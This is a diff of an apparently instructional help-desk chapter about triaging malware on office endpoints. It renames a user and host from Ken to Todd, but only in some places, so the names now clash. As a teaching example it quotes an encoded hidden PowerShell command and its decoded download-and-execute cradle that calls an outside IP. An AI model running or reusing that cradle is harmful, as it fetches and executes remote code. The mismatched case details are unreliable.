@@ -38,7 +38,7 @@ On the whiteboard beside the dispatch monitor, the sticky note from yesterday's 
 $$\boxed{\textbf{Does this need to leave the network?}}$$
 
 Ethan’s desk drawer still holds his port flashcards and factor reference tables, but Thursday morning's queue is not about firewall rules or forgotten passwords. It is about malicious execution, compromised endpoints, and host persistence:
-* **Ken from the warehouse** walked into the dispatch bullpen holding an unbranded 32GB USB flash drive with the words *"CLIENT DECK"* scribbled in blue sharpie. Within four minutes of plugging it into his laptop (`KEN-SALES-14`) to check a purchase order, his laptop cooling fans spun up to an ear-splitting 100%, and EDR raised high-priority alerts: a hidden PowerShell process was enumerating domain shares and copying itself across the warehouse network (`\\WH-PACK-02\share$`).
+* **Ken from the warehouse** walked into the dispatch bullpen holding an unbranded 32GB USB flash drive with the words *"CLIENT DECK"* scribbled in blue sharpie. Within four minutes of plugging it into his laptop (`TODD-SALES-14`) to check a purchase order, his laptop cooling fans spun up to an ear-splitting 100%, and EDR raised high-priority alerts: a hidden PowerShell process was enumerating domain shares and copying itself across the warehouse network (`\\WH-PACK-02\share$`).
 * **Maya in Accounting** downloaded an unauthorized "free PDF merger" from an external forum. While the merger works, her browser opened twenty coupon pop-ups, and a background task named `OptimizeRAM.exe` began injecting ads and phoning home.
 * **Dana in Facilities** called in a voice forced to a calm whisper: every spreadsheet and work order on her desktop has been renamed with a `.locked` extension, and a text file named `README_RESTORE.txt` demands 0.5 Bitcoin within 72 hours.
 * **Lila in HR** noticed significant keyboard lag; Task Manager revealed a suspicious process named `FontUpdateHelper.exe` capturing keystrokes via Windows API hooks.
@@ -208,10 +208,10 @@ Get-FileHash -Path "C:\junk-scan\SOW_final.pdf.exe" -Algorithm SHA256 | Format-L
 ### Drill 1: Deciphering Encoded PowerShell Payloads
 
 #### The Scenario
-At 10:17 AM, Ken Vance from Sales called the help desk in a panic: his laptop fans were roaring like a jet engine, and his mouse was stuttering. You open the EDR console and locate an alert for workstation `KEN-SALES-14`. The alert reveals that a parent scheduled task spawned a hidden, encoded PowerShell session:
+At 10:17 AM, Ken Vance from Sales called the help desk in a panic: his laptop fans were roaring like a jet engine, and his mouse was stuttering. You open the EDR console and locate an alert for workstation `TODD-SALES-14`. The alert reveals that a parent scheduled task spawned a hidden, encoded PowerShell session:
 
 ```console
-caption: EDR Alert Command Line · Host: KEN-SALES-14 · PID: 6412
+caption: EDR Alert Command Line · Host: TODD-SALES-14 · PID: 6412
 powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwAkAHMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKABoAHQAdABwADoALwAvADEAOAA1AC4AMgAyAC4AMQAxADIALgAxADQAOgA4ADAAOAAwAC8AdQBwAGQAYQB0AGUALgBwAHMAMQApACAAfAAgAEkARQBYAA==
 ```
 
@@ -225,7 +225,7 @@ You open a PowerShell terminal on your management workstation to de-obfuscate th
       "EventID": 4104,
       "TimeCreated": { "SystemTime": "2026-10-22T10:17:42.184912Z" },
       "Execution": { "ProcessID": 6412 },
-      "Computer": "KEN-SALES-14.harrowmere.local"
+      "Computer": "TODD-SALES-14.harrowmere.local"
     },
     "EventData": {
       "ScriptBlockText": "$s=New-Object Net.WebClient;$s.DownloadString('http://185.22.112.14:8080/update.ps1') | IEX",
@@ -407,7 +407,7 @@ Stop-Process -Id 4812 -Force: |
 </div>
 
 
-#### Ticket 1: Ken Vance (Sales / Warehouse) — `INC-2026-1181`
+#### Ticket 1: Todd Miller (Sales / Warehouse) — `INC-2026-1181`
 *Request:* "Found an unlabeled USB stick in the shipping bay. Plugged it in to see who owns it, and my laptop fans immediately spun up to 100%. Antivirus quarantined `SOW_final.pdf.exe`. Can I just unplug the USB, empty my recycle bin, and keep working on my sales forecast?"
 
 * **Your Action:** [ Clear Alert & Resume / Isolate Host & Audit Network Shares / Scan USB on Laptop ]
@@ -518,15 +518,15 @@ Stop-Process -Id 4812 -Force: |
 In enterprise security operations, Tier 1 service desk notes serve as the initial chain-of-custody and incident triage record for Tier 2/3 SOC analysts, compliance teams, and management.
 
 #### Part A: Tier 1 Standard Host Infection Isolation & Containment Note
-*(Reference Case: Ken Vance / Workstation `KEN-SALES-14` / Incident `INC-2026-1181`)*
+*(Reference Case: Ken Vance / Workstation `TODD-SALES-14` / Incident `INC-2026-1181`)*
 
 ```text
 ================================================================================
 TIER 1 INCIDENT CONTAINMENT NOTE - PORTLAND SERVICE DESK
 ================================================================================
 Ticket ID:        INC-2026-1181
-Affected Host:    KEN-SALES-14 (IP: 192.168.10.45)
-User / Dept:      Ken Vance (Sales & Warehouse Operations)
+Affected Host:    TODD-SALES-14 (IP: 192.168.10.45)
+User / Dept:      Todd Miller (Sales & Warehouse Operations)
 Technician:       Ethan Mercer (Tier 1 Support)
 Lead Reviewer:    Jules Brooks (Service Desk Lead)
 Timestamp:        2026-10-22 10:35:12 PST
@@ -573,7 +573,7 @@ Status:           CONTAINED / ESCALATED TO SOC
    - External C2 IP (185.22.112.14:8080) submitted to Network Operations for
      perimeter firewall drop rule across all corporate egress interfaces.
    - Issued user a clean, hardened loaner workstation (PORT-LNR-04).
-   - Primary workstation KEN-SALES-14 scheduled for disk imaging and bare-metal reimage.
+   - Primary workstation TODD-SALES-14 scheduled for disk imaging and bare-metal reimage.
 ================================================================================
 ```
 
@@ -652,11 +652,11 @@ Status:           ISOLATED / EMERGENCY SOC BRIDGE ENGAGED
 ```callout-panel
 title: "FIGURE 10.2: PERSISTENCE HUNT & HOST CONTAINMENT"
 badge: "Shift Epilogue"
-caption: "Operations bullpen: At 05:45 PM, the terminal fans spin down to a whisper. On Ethan's dual monitor setup, Sysinternals Autoruns shows the malicious Run key stripped, and Ken's laptop sits isolated on the quarantine bench awaiting a bare-metal reimage."
+caption: "Operations bullpen: At 05:45 PM, the terminal fans spin down to a whisper. On Ethan's dual monitor setup, Sysinternals Autoruns shows the malicious Run key stripped, and Todd's laptop sits isolated on the quarantine bench awaiting a bare-metal reimage."
 prompt: "Clean graphic novel cutaway panel of an IT support technician workbench in the late afternoon. An open laptop with its Ethernet cable unplugged sits on an anti-static mat next to a monitor displaying a process management console with clean status indicators. Ligne claire style, sharp technical ink linework, no text, no words. 16:9 ratio."
 ```
 
-With Ken's laptop disconnected and the obfuscated PowerShell payload decoded, SOC pushed an enterprise rule blocking the C2 domain. We extracted the malicious scheduled task `CacheCleanup`, purged the persistence Run keys in Autoruns, and scheduled both endpoints for a clean bare-metal reimage. Dana's locked files were queued for an offline snapshot restore from the immutable backup vault.
+With Todd's laptop disconnected and the obfuscated PowerShell payload decoded, SOC pushed an enterprise rule blocking the C2 domain. We extracted the malicious scheduled task `CacheCleanup`, purged the persistence Run keys in Autoruns, and scheduled both endpoints for a clean bare-metal reimage. Dana's locked files were queued for an offline snapshot restore from the immutable backup vault.
 
 Across the bullpen, the rest of the shift brought the quieter, deeper variants of persistence.
 
@@ -744,7 +744,7 @@ The end-of-day bridge call was short, which I have learned is a compliment when 
 
 | IoC we actually wrote down | Why it still matters tomorrow |
 | --- | --- |
-| Hosts: KEN-SALES-14, WH-PACK-02, MAYA-W11 | Pattern, not a one-off |
+| Hosts: TODD-SALES-14, WH-PACK-02, MAYA-W11 | Pattern, not a one-off |
 | [[hash|SHA256]] on the USB dropper | Catalog already knew it; next USB might |
 | Domain `185.22.xx.14` on 443 / 5 min | Nora's beacon |
 | Task name `CacheCleanup` | Worm commute |
